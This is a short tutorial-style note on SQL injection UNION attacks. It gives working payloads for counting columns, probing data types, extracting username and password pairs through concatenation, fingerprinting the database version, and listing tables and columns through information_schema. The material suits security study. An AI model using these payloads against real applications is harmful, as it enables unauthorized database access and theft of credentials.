# Union Attacks
This is done by adding our own `UNION <query>` to the original query.
Conditions:
1. Our query returns the same number of columns as the og.
2. Data types in each column must be compatible for both.

#### Finding Number of Columns
1. Keep injecting `' ORDER BY x--` till error hits/output changes.
2. Keep injecting `' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--`, `' UNION SELECT NULL,NULL,NULL--`, etc. till it works.

Oracle DBs specifically need a `FROM` keyword with `SELECT` like `SELECT NULL FROM TABLE`. But all Oracle DBs have a "DUAL" table which can be used with NULL. So do `' UNION SELECT NULL FROM DUAL--`

#### Finding suitable Datatype-Columns
Probe each column like `' UNION SELECT 'a', NULL, NULL, NULL (FROM DUAL)--`, see which ones don't cause errors.

If only one column is available for extraction, you can use concatenation with separators to merge data into that column itself.
`' UNION SELECT username || '~' || password FROM users--` on Oracle (double pipe concatenates using ~).

#### What next?
Now you know which columns are suitable for text retrieval. So we can move on to getting data from other tables. For this we need column names of those tables, and the table names.

Every DB has a way to do this.

#### Finding DB Type and Version

            DB Type                |                    Command
				Microsoft/MySQL      |           SELECT @@version
				Oracle               |    SELECT * FROM v$version
				PostgreSQL           |           SELECT version()
	Use a UNION for this too.



#### Finding Table & Column Data

Non-Oracle DBs have an information-schema.

A query `SELECT * from information_schema.tables` returns something like 
```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE 
===================================================== 
MyDatabase    dbo           Products  BASE TABLE 
MyDatabase    dbo           Users     BASE TABLE 
MyDatabase    dbo           Feedback  BASE TABLE
```

Now, a simple `SELECT * FROM information_schema.columns WHERE table_name = <>` should give something like:
```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE 
================================================================= 
MyDatabase    dbo          Users       UserId     int 
MyDatabase    dbo          Users       Username   varchar 
MyDatabase    dbo          Users       Password   varchar
```
